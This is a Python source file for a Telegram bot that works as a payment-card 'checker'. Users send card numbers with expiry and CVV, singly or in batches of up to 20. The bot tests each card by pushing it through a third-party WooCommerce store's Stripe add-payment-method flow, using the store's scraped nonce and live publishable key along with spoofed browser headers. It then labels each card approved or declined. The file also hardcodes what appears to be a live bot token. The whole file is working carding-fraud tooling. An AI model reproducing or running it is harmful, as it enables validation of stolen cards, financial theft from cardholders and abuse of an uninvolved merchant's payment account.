import os
import aiohttp
import asyncio
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.types import InputFile, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor

# ==== CONFIG ====
TOKEN = "8003502803:AAHz0pg5zbhjZaeNsdR3FudgT2Yx1PMuF0s"  # <--- put your token here
DOMAIN = "https://infiniteautowerks.com/"
PK = "pk_live_51MwcfkEreweRX4nmQHMS2A6b1LooXYEf671WoSSZTusv9jAbcwEwE5cOXsOAtdCwi44NGBrcmnzSy7LprdcAs2Fp00QKpqinae"
CHECKER_NAME = "Bᴜɴɴʏ"  # your checker name

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

# ==== CACHES FOR BUTTONS ====
approved_cache = {}
declined_cache = {}
total_cache = {}

# ==== UTILITIES ====
def format_result(card, status, gate, bin_, country, issuer, typ, time, by):
    return (
        "━━━━━━━━━━━━━━━\n"
        f"[💳] 𝗖𝗮𝗿𝗱: <code>{card}</code>\n"
        f"[🚦] 𝗦𝘁𝗮𝘁𝘂𝘀: <b>{status}</b>\n"
        f"[🔗] 𝗚𝗮𝘁𝗲: <b>{gate}</b>\n"
        "━━━━━━━━━━━━━━━\n"
        f"[🏦] 𝗕𝗜𝗡: <code>{bin_}</code>\n"
        f"[🌎] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: <b>{country}</b>\n"
        f"[🏢] 𝗜𝘀𝘀𝘂𝗲𝗿: <b>{issuer}</b>\n"
        f"[💠] 𝗧𝘆𝗽𝗲: <b>{typ}</b>\n"
        "━━━━━━━━━━━━━━━\n"
        f"[⏰] 𝗧𝗶𝗺𝗲: <code>{time}</code>\n"
        f"[👤] 𝗕𝘆: <b>{by}</b>\n"
        "━━━━━━━━━━━━━━━"
    )

def get_bin_info(cc):
    # 🟡 Replace with a real BIN lookup if needed
    bin_ = cc[:6]
    # Demo data for sample BIN
    bin_data = {
        "451015": ("CANADA 🇨🇦", "ROYAL BANK OF CANADA", "CREDIT - VISA"),
        # add more bins if you want
    }
    return bin_data.get(bin_, ("UNKNOWN", "UNKNOWN", "UNKNOWN"))

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

async def make_request(session, url, method="POST", params=None, headers=None, data=None, json=None):
    async with session.request(
        method,
        url,
        params=params,
        headers=headers,
        data=data,
        json=json,
    ) as response:
        return await response.text()

async def ppc(cards):
    # You can improve error checking here
    cc, mon, year, cvv = cards.split("|")
    year = year[-2:]

    async with aiohttp.ClientSession() as my_session:
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "max-age=0",
            "priority": "u=0, i",
            "referer": f"{DOMAIN}/my-account/payment-methods/",
            "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        }

        req = await make_request(
            my_session,
            url=f"{DOMAIN}/my-account/add-payment-method/",
            method="GET",
            headers=headers,
        )
        await asyncio.sleep(1)
        nonce = parseX(req, '"createAndConfirmSetupIntentNonce":"', '"')

        headers2 = {
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "priority": "u=1, i",
            "referer": "https://js.stripe.com/",
            "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        }

        data2 = {
            "type": "card",
            "card[number]": f"{cc}",
            "card[cvc]": f"{cvv}",
            "card[exp_year]": f"{year}",
            "card[exp_month]": f"{mon}",
            "allow_redisplay": "unspecified",
            "billing_details[address][postal_code]": "99501",
            "billing_details[address][country]": "US",
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; payment-element; deferred-intent",
            "referrer": DOMAIN,
            "time_on_page": "187650",
            "client_attribution_metadata[client_session_id]": "8c6ceb69-1a1d-4df7-aece-00f48946fa47",
            "client_attribution_metadata[merchant_integration_source]": "elements",
            "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
            "client_attribution_metadata[merchant_integration_version]": "2021",
            "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
            "guid": "19ae2e71-398b-4dff-929f-1578fe0c0a1a4731fd",
            "muid": "2b6bbdfd-253b-4197-b81b-4d9f3035cd009df6c5",
            "sid": "ad7b0952-8857-4cfd-b07f-3f43034df86cea6048",
            "key": PK,
            "_stripe_version": "2024-06-20",
        }

        req2 = await make_request(
            my_session,
            f"https://api.stripe.com/v1/payment_methods",
            headers=headers2,
            data=data2,
        )
        await asyncio.sleep(1)
        pmid = parseX(req2, '"id": "', '"')

        headers3 = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": DOMAIN,
            "priority": "u=1, i",
            "referer": f"{DOMAIN}/my-account/add-payment-method/",
            "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }
        data3 = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pmid,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": nonce,
        }
        req4 = await make_request(
            my_session,
            url=f"{DOMAIN}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
            headers=headers3,
            data=data3,
        )
        # Mocking: simulate status for demo, replace with actual parsing logic
        if "succeeded" in req4 or "APPROVED" in req4 or "setup_intent" in req4:
            return "APPROVED"
        else:
            return "DECLINED"

# ==== BOT COMMANDS ====

@dp.message_handler(commands=["start", "help"])
async def start_help(message: types.Message):
    await message.reply(
        "<b>Card Checker Bot</b>\n\n"
        "Commands:\n"
        "• /chk <code>CC|MM|YY|CVV</code> — Single check\n"
        "• /mchk <code>CC|MM|YY|CVV</code> — Same as /chk\n"
        "• /mass — Mass check (upload .txt file, max 20)\n",
        parse_mode="HTML"
    )

@dp.message_handler(commands=["chk", "mchk"])
async def chk_handler(message: types.Message):
    args = message.get_args().strip()
    if not args:
        await message.reply("Usage: `/chk 4242424242424242|12|25|123`", parse_mode="Markdown")
        return
    card = args
    checking_msg = await message.reply(f"🔄 Checking: <code>{card}</code>", parse_mode="HTML")
    try:
        result = await ppc(card)
        status = "APPROVED ✅" if "APPROVED" in result else "DECLINED ❌"
        bin_, country, issuer, typ = card[:6], *get_bin_info(card)
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        text = format_result(card, status, "Stripe Auth", bin_, country, issuer, typ, now, CHECKER_NAME)
        await checking_msg.edit_text(text, parse_mode="HTML")
    except Exception as e:
        await checking_msg.edit_text(f"Error: <code>{e}</code>", parse_mode="HTML")

@dp.message_handler(commands=["mass"])
async def mass_check_prompt(message: types.Message):
    await message.reply("Send me a <b>.txt</b> file with up to 20 cards (<code>CC|MM|YY|CVV</code> per line).", parse_mode="HTML")

@dp.message_handler(content_types=types.ContentType.DOCUMENT)
async def handle_document(message: types.Message):
    doc = message.document
    if not doc.file_name.endswith(".txt"):
        await message.reply("Only .txt files are supported.")
        return
    file = await doc.download()
    with open(file.name, "r") as f:
        lines = [line.strip() for line in f if line.strip()]
    os.remove(file.name)
    if len(lines) > 20:
        await message.reply("❌ Maximum 20 cards allowed in mass check.")
        return
    checking_msg = await message.reply(f"🔄 Checking {len(lines)} cards...", parse_mode="HTML")
    approved, declined = [], []
    for i, card in enumerate(lines, 1):
        try:
            result = await ppc(card)
            if "APPROVED" in result:
                approved.append(card)
            else:
                declined.append(card)
        except:
            declined.append(card)
    # Save for callbacks
    uid = message.from_user.id
    approved_cache[uid] = approved
    declined_cache[uid] = declined
    total_cache[uid] = lines
    # Create buttons
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton(f"✅ Approved ({len(approved)})", callback_data="show_approved"),
        InlineKeyboardButton(f"❌ Declined ({len(declined)})", callback_data="show_declined"),
        InlineKeyboardButton(f"🔢 Total: {len(lines)}", callback_data="show_total")
    )
    summary = (
        f"✅ <b>Approved:</b> {len(approved)}\n"
        f"❌ <b>Declined:</b> {len(declined)}\n"
        f"🔢 <b>Total:</b> {len(lines)}"
    )
    await checking_msg.edit_text("🎉 <b>Check complete!</b>\n" + summary, parse_mode="HTML", reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data in ["show_approved", "show_declined", "show_total"])
async def process_callback_btn(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    if callback_query.data == "show_approved":
        cards = approved_cache.get(user_id, [])
        text = "✅ <b>Approved Cards</b>:\n" + "\n".join(f"<code>{c}</code>" for c in cards) if cards else "No approved cards."
    elif callback_query.data == "show_declined":
        cards = declined_cache.get(user_id, [])
        text = "❌ <b>Declined Cards</b>:\n" + "\n".join(f"<code>{c}</code>" for c in cards) if cards else "No declined cards."
    elif callback_query.data == "show_total":
        cards = total_cache.get(user_id, [])
        text = "🔢 <b>All Cards</b>:\n" + "\n".join(f"<code>{c}</code>" for c in cards)
    await callback_query.answer()
    await callback_query.message.reply(text, parse_mode="HTML")

# ==== RUN BOT ====
if __name__ == "__main__":
    from aiogram import executor
    executor.start_polling(dp, skip_updates=True)
